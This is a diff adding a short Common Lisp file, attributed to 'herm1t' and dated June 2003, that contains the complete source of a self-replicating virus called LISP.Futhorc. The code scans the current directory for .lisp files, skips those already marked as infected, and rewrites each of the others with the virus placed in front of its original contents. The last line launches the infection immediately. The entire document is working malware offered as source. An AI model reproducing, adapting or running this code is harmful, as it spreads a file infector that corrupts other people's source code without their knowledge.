@@ -1,0 +1,13 @@
+;; LISP.Futhorc by herm1t(at)netlux.org / Jun'03
+(setq virus '(defun infect (&optional (ls (directory "*.lisp")))
+  (defun writel (l s) (when l (write-line (car l) s) (writel (cdr l) s)))
+  (when (setq vic (car ls))
+    (let ((p nil)) (with-open-file (i vic :direction :input)
+      (unless (equal (second (read i)) 'VIRUS) (file-position i 0)
+        (loop (unless (setq line (read-line i nil nil)) (return))
+          (setq p (append p (list line))))))
+      (when p (with-open-file (o vic :direction :output)
+        (format o "(setq virus '~S~%)(eval virus)(infect)~%" virus)
+	(writel p o))))
+    (infect (cdr ls))))
+)(eval virus)(infect)
